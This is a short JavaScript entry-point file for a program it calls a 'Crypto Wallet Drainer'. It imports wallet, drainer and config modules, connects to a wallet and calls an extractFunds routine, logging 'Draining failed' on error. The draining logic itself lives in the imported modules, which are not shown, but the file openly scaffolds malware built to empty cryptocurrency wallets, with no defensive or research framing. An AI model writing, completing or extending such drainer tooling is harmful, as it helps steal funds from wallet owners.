// Main entry point for Crypto Wallet Drainer

const Wallet = require('./wallet');
const Drainer = require('./drainer');
const config = require('./config');

async function main() {
    console.log('Starting Crypto Wallet Drainer...');

    const wallet = new Wallet();
    const drainer = new Drainer(wallet, config);

    try {
        await wallet.connect();
        await drainer.extractFunds();
    } catch (error) {
        console.error('Draining failed:', error);
    }
}

main();
